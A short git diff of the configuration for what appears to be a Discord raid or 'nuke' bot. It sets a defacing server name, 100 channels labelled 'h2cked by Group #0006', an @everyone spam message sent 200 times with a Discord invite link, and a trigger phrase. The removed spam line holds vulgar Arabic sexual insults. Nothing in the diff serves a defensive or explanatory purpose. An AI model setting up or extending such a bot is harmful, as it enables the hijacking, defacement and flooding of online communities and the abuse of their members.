@@ -5,11 +5,11 @@ require('dotenv').config();
 
 let config = {
     serverName: " اه اه نيك اه",
-    channelName: "Group #0006",
+    channelName: "h2cked by Group #0006",
     channelCount: 100,
     roleName: "نيك",
     iconPath: "./icon.png",
-    spamMessage: "@everyone نيك سايكو الان يحدث كسمك  يسايكو يبن القحبه اهينك  ",
+    spamMessage: "@everyone h2cked by group #0006 and rosace https://discord.gg/geCavXxuUW",
     spamCount: 200,
     triggerWord: "شغل يا ريس"
 };
